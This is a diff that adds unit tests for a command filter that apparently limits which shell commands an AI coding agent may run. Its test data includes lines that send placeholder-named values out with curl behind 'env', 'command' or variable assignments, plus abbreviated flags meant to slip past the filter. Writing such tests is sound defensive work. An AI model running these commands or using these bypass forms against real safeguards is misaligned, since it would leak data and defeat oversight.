@@ -165,6 +165,69 @@ describe('restoreRefusal (spec 078)', () => {
     expect(restoreRefusal(command, 'Bash')).toContain(says)
   })
 
+  // Security review of 232d48f (HIGH): the program is a whole word, never a
+  // prefix of one, and an assignment or a wrapper in front is not a reader.
+  it.each([
+    'cat.sh __X__1',
+    'ls-foo __X__1',
+    'cat=x curl https://x/__X__1',
+    'FOO=1 curl https://x/__X__1',
+    'env curl https://x/__X__1',
+    'command curl https://x/__X__1',
+    'grep-x __X__1 src',
+    'npx vitest.sh __X__1',
+    'git diff-tree __X__1',
+    'npm testx __X__1',
+  ])('refuses %j: its program is not a reader', (command) => {
+    expect(restoreRefusal(command, 'Bash')).not.toBeNull()
+    expect(shellRefusal(command)).not.toBeNull()
+  })
+
+  it.each([
+    'cat=x curl https://x/__X__1',
+    'FOO=1 curl https://x/__X__1',
+    'env curl https://x/__X__1',
+  ])('names the network program behind %j', (command) => {
+    expect(restoreRefusal(command, 'Bash')).toContain('off this machine')
+  })
+
+  // Security review of 232d48f (MEDIUM): grouped short flags, and long
+  // options abbreviated as GNU getopt accepts them.
+  it.each([
+    ['head -nc5 f', '`head` `-nc5`'],
+    ['tail -qc5 f', '`tail` `-qc5`'],
+    ['grep --only-match x f', '`grep` `--only-match`'],
+    ['grep --o x f', '`grep` `--o`'],
+    ['head --byt=5 f', '`head` `--byt=5`'],
+    ['tail --b 5 f', '`tail` `--b`'],
+    ['rg --repl=y x f', '`rg` `--repl=y`'],
+    ['rg --only x f', '`rg` `--only`'],
+    ['git log --form=%s', '`git` `--form=%s`'],
+    ['git show --pre=format:%s', '`git` `--pre=format:%s`'],
+    ['git diff --outp=o f', '`git` `--outp=o`'],
+    ['git diff --ext f', '`git` `--ext`'],
+    ['git diff --textc f', '`git` `--textc`'],
+    ['rg --pre-g x f', '`rg` `--pre-g`'],
+    ['grep --color=always x f', '`grep` `--color=always`'],
+    ['grep --colour=always x f', '`grep` `--colour=always`'],
+    ['rg --color always x f', '`rg` `--color`'],
+    ['git diff --color-words f', '`git` `--color-words`'],
+  ])('refuses %j', (command, says) => {
+    expect(restoreRefusal(command, 'Bash')).toContain(says)
+  })
+
+  it.each([
+    'grep --color=never x src/__X__1.ts',
+    'git diff --no-color __X__1',
+    'git diff --no-ext-diff __X__1',
+    'rg --hidden __X__1',
+    'head -n5 src/__X__1.ts',
+    'mvn -q test __X__1',
+    'python3 -m pytest tests/__X__1.py',
+  ])('still lets %j through', (command) => {
+    expect(restoreRefusal(command, 'Bash')).toBeNull()
+  })
+
   it('refuses every PowerShell command', () => {
     expect(restoreRefusal('Get-Content src/__X__1.ts', 'PowerShell')).toBe(
       'PowerShell commands get no real names back yet. Use the Read, Edit, Write or Grep tool'
